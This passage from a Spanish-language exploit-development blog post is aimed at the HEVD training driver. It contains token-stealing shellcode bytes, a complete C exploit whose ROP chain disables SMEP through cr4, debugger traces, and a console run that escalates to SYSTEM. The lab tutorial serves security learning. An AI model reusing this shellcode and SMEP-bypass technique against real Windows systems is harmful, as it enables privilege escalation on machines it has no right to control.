    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi">
    0x66</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x66</span><span class="p">,</span><span class="mi"> 0xff</span><span class="p">,</span><span class="mi"> 0xc1</span><span class="p">,</span><span class="mi"> 0x66</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi">
    0x8a</span><span class="p">,</span><span class="mi"> 0xe4</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x92</span><span class="p">,</span><span class="mi"> 0x90</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi">
    0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xaa</span><span class="p">,</span><span class="mi"> 0x58</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8a</span><span class="p">,</span><span class="mi"> 0x68</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi">
    0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x4c</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9a</span><span class="p">,</span><span class="mi"> 0x78</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xa2</span><span class="p">,</span><span class="mi">
    0x80</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x31</span><span class="p">,</span><span class="mi"> 0xc0</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0xf8</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x0f</span><span class="p">,</span><span class="mi"> 0x07
</span><span class="p">};

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
    </span><span class="na">DWORD</span><span class="p"> needed;

    EnumDeviceDrivers(drivers,</span><span class="mi"> 1024</span><span class="p">,</span><span class="o"> &</span><span class="p">needed);  
    </span><span class="na">LPVOID</span><span class="p"> ntoskrnl_base </span><span class="o">=</span><span class="p"> drivers[</span><span class="mi">0</span><span class="p">];

    </span><span class="na">LPVOID</span><span class="p"> payload</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 2104</span><span class="p">, MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    </span><span class="na">LPVOID</span><span class="p"> shellcode </span><span class="o">= </span><span class="p">VirtualAlloc(</span><span class="mi">NULL</span><span class="p">, </span><span class="o">sizeof</span><span class="p">(token_stealing), MEM_COMMIT </span><span class="o">| </span><span class="p">MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlFillMemory(payload,</span><span class="mi"> 2072</span><span class="p">,</span><span class="s"> 'A'</span><span class="p">);
    RtlCopyMemory(shellcode, token_stealing,</span><span class="o"> sizeof</span><span class="p">(token_stealing));

    </span><span class="na">ULONGLONG</span><span class="o"> *</span><span class="p">rop</span><span class="o"> =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="o"> *</span><span class="p">) ((</span><span class="na">ULONGLONG</span><span class="p">) payload </span><span class="o">+ </span><span class="mi">2072</span><span class="p">);

    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) ntoskrnl_base</span><span class="o"> +</span><span class="mi"> 0x2163ec</span><span class="p">; </span><span class="c1">// pop rcx; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) </span><span class="mi">0x350ef8</span><span class="o"> ^</span><span class="mi"> 1</span><span class="no">UL</span><span class="o"> << </span><span class="mi">20</span><span class="p">;</span><span class="c1">     // cr4 value
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) ntoskrnl_base</span><span class="o"> +</span><span class="mi"> 0x3a06a7</span><span class="p">; </span><span class="c1">// mov cr4, rcx; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">ULONGLONG</span><span class="p">) shellcode;</span><span class="c1">                // token stealing

    </span><span class="na">HANDLE</span><span class="p"> handle </span><span class="o">= </span><span class="p">CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">HacksysExtremeVulnerableDriver"</span><span class="p">, GENERIC_READ </span><span class="o">|</span><span class="p"> GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);  

    </span><span class="o">if </span><span class="p">(handle </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">puts</span><span class="p">(</span><span class="s">"[-] Failed to get handle"</span><span class="p">);
        </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
    }

    DeviceIoControl(handle,</span><span class="mi"> 0x222003</span><span class="p">, payload,</span><span class="mi"> 2104</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);

    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
    </span><span class="no">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Para comprobarlo volvemos a establecer un breakpoint en el <code class="language-plaintext highlighter-rouge">ret</code> y avanzamos hasta justo antes de mover el nuevo valor al registro <code class="language-plaintext highlighter-rouge">cr4</code> para verificar que funcione</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
HEVD!TriggerBufferOverflowStack+0x10b:
fffff806`424966bf c3              ret

</span><span class="ro">0: kd></span><span class="p"> p
nt!KiSetAddressPolicy+0x1c:
fffff806`3a6163ec 59              pop     rcx

</span><span class="ro">0: kd></span><span class="p"> p
nt!KiSetAddressPolicy+0x1d:
fffff806`3a6163ed c3              ret

</span><span class="ro">0: kd></span><span class="p"> p
nt!KeFlushCurrentTbImmediately+0x17:
fffff806`3a7a06a7 0f22e1          mov     cr4,rcx  </span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar <code class="language-plaintext highlighter-rouge">mov</code> modifica el valor de <code class="language-plaintext highlighter-rouge">cr4</code> cambiando el bit <code class="language-plaintext highlighter-rouge">20</code> a <code class="language-plaintext highlighter-rouge">0</code> y deshabilitando la protección <code class="language-plaintext highlighter-rouge">SMEP</code> asi pudiendo ejecutar asi el shellcode en el modo de usuario</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> r cr4
cr4=0000000000350ef8

</span><span class="ro">0: kd></span><span class="p"> p
00000178`c9220000 65488b142588010000 mov   rdx,qword ptr gs:[188h]

</span><span class="ro">0: kd></span><span class="p"> r cr4
cr4=0000000000250ef8

</span><span class="ro">0: kd></span><span class="p"> g</span>
</code></pre></div></div><br>

<p class="plain-text">Si simplemente continuamos la ejecución podemos ver que el exploit funciona</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
windows\user

C:\Users\user\Desktop> </span><span class="am">exploit.exe</span><span class="p">
Microsoft Windows [Versión 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.  

C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - DarthBear</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>